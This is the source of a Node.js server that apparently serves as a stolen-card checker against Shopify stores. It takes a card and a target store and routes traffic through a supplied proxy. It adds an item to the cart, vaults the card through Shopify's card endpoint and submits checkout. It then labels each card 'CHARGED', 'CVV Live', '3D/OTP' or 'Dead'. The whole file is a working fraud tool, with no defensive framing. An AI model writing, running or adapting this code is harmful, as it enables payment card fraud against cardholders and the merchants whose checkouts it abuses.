const express = require('express');
const puppeteer = require('puppeteer');
const app = express();

app.use(express.json());

app.get('/', (req, res) => {
    res.send({ status: "Shopify Headless Browser Engine Active" });
});

app.post('/api/charge', async (req, res) => {
    const { card, site, proxy } = req.body;

    if (!card || !site) {
        return res.json({ status: "Dead", message: "MISSING_DATA", gateway: "Shopify Payments", price: "-", site: site || "N/A" });
    }

    let cleanSite = site.trim().replace(/\/$/, '');
    if (!cleanSite.startsWith('http')) {
        cleanSite = 'https://' + cleanSite;
    }

    const [ccNo, expMonth, expYear, cvv] = card.split('|');

    if (!ccNo || ccNo.length < 15 || ccNo.length > 16 || !expMonth || !expYear || !cvv) {
        return res.json({ status: "Dead", message: "INVALID_CARD_FORMAT", gateway: "Shopify Payments", price: "-", site: cleanSite });
    }

    console.log(`⚡ [Railway API] Target: ${cleanSite}`);

    let browser = null;
    try {
        let proxyServer = null;
        let proxyAuth = null;

        if (proxy && typeof proxy === 'string' && proxy.trim().length > 0) {
            let pClean = proxy.trim();
            const parts = pClean.split(':');
            if (parts.length >= 4) {
                proxyServer = `http://${parts[0]}:${parts[1]}`;
                proxyAuth = { username: parts[2], password: parts.slice(3).join(':') };
            } else {
                proxyServer = `http://${pClean}`;
            }
        }

        const launchOptions = {
            headless: 'new',
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
        };

        if (proxyServer) {
            launchOptions.args.push(`--proxy-server=${proxyServer}`);
        }

        browser = await puppeteer.launch(launchOptions);
        const page = await browser.newPage();

        if (proxyAuth) {
            await page.authenticate(proxyAuth);
        }

        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36');
        
        const prodRes = await page.goto(`${cleanSite}/products.json?limit=10`, { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(() => null);
        if (!prodRes) {
            await browser.close();
            return res.json({ status: "Dead", message: "PROXY_CONNECTION_TIMEOUT", gateway: "Shopify Payments", price: "-", site: cleanSite });
        }

        const responseText = await page.evaluate(() => document.body.innerText).catch(() => "");
        let prodData = {};
        try {
            prodData = JSON.parse(responseText);
        } catch (e) {
            await browser.close();
            return res.json({ status: "Dead", message: "STORE_BLOCKED_OR_JSON_PROTECTED", gateway: "Shopify Payments", price: "-", site: cleanSite });
        }

        let selectedVariantId = null;
        let selectedPrice = 5.00;

        if (prodData && prodData.products && prodData.products.length > 0) {
            for (const prod of prodData.products) {
                for (const v of prod.variants) {
                    const p = parseFloat(v.price);
                    if (p > 0 && v.available) {
                        selectedVariantId = v.id;
                        selectedPrice = p;
                        break;
                    }
                }
                if (selectedVariantId) break;
            }
        }

        if (!selectedVariantId) {
            await browser.close();
            return res.json({ status: "Dead", message: "NO_AVAILABLE_PRODUCTS", gateway: "Shopify Payments", price: "-", site: cleanSite });
        }

        const formattedPrice = `$${selectedPrice.toFixed(2)}`;

        const addCartSuccess = await page.evaluate(async (variantId) => {
            try {
                const res = await fetch('/cart/add.js', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ id: variantId, quantity: 1 })
                });
                return res.ok;
            } catch (err) {
                return false;
            }
        }, selectedVariantId);

        if (!addCartSuccess) {
            await browser.close();
            return res.json({ status: "Dead", message: "CART_ADD_FAILED", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

        const vaultResult = await page.evaluate(async (ccNo, expMonth, expYear, cvv) => {
            try {
                const response = await fetch('https://elb.deposit.shopifycs.com/sessions', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                    body: JSON.stringify({
                        credit_card: { number: ccNo, month: expMonth, year: expYear, name: "Valued Customer", verification_value: cvv }
                    })
                });
                return await response.json();
            } catch (e) {
                return { error: e.message };
            }
        }, ccNo, expMonth, expYear, cvv);

        if (!vaultResult || !vaultResult.id) {
            await browser.close();
            return res.json({ status: "Dead", message: "CARD_VAULT_FAILED", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

        await page.goto(`${cleanSite}/checkout`, { waitUntil: 'domcontentloaded', timeout: 25000 }).catch(() => null);

        const paymentResponse = await page.evaluate(async (vaultId) => {
            try {
                const res = await fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
                    body: JSON.stringify({
                        step: 'payment',
                        s: vaultId,
                        checkout: { credit_card: { vault_id: vaultId } }
                    })
                });
                const text = await res.text();
                let parsedJson = null;
                try { parsedJson = JSON.parse(text); } catch (e) {}
                return { url: res.url, text: text, json: parsedJson };
            } catch (e) {
                return { error: e.message };
            }
        }, vaultResult.id);

        await browser.close();
        browser = null;

        if (paymentResponse.error) {
            return res.json({ status: "Dead", message: paymentResponse.error, gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

        const respText = paymentResponse.text.toLowerCase();
        const finalUrl = paymentResponse.url;
        let authenticError = "DECLINED_BY_PROCESSOR";
        
        if (paymentResponse.json) {
            if (paymentResponse.json.message) authenticError = paymentResponse.json.message;
            else if (paymentResponse.json.error) authenticError = typeof paymentResponse.json.error === 'string' ? paymentResponse.json.error : JSON.stringify(paymentResponse.json.error);
        }

        // Strict real-charge check filtering out test modes and bogus gateways
        const isRealSuccess = 
            (finalUrl.includes('thank_you') || paymentResponse.text.includes('thank_you')) && 
            (paymentResponse.text.includes('order_number') || paymentResponse.text.includes('checkout_token')) &&
            paymentResponse.text.includes('transactions') &&
            !respText.includes('error') &&
            !respText.includes('declined') &&
            !respText.includes('test mode');

        if (isRealSuccess) {
            return res.json({ status: "CHARGED", message: "ORDER_PLACED_SUCCESSFULLY", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (respText.includes('insufficient_funds') || respText.includes('insufficient funds')) {
            return res.json({ status: "CVV Live/Insufficient", message: "INSUFFICIENT_FUNDS", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (respText.includes('three_d_secure') || respText.includes('challenge') || respText.includes('3d secure')) {
            return res.json({ status: "3D/OTP", message: "CHALLENGE_REQUIRED_3DS", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else if (respText.includes('incorrect_cvc') || respText.includes('security code')) {
            return res.json({ status: "CVV Live/Insufficient", message: "CCN_LIVE_INCORRECT_CVC", gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        } else {
            return res.json({ status: "Dead", message: authenticError, gateway: "Shopify Payments", price: formattedPrice, site: cleanSite });
        }

    } catch (err) {
        if (browser) {
            try { await browser.close(); } catch(e) {}
        }
        return res.json({ status: "Dead", message: `SERVER_EXECUTION_ERROR`, gateway: "Shopify Payments", price: "-", site: site || "N/A" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Headless Browser API running on port ${PORT}`));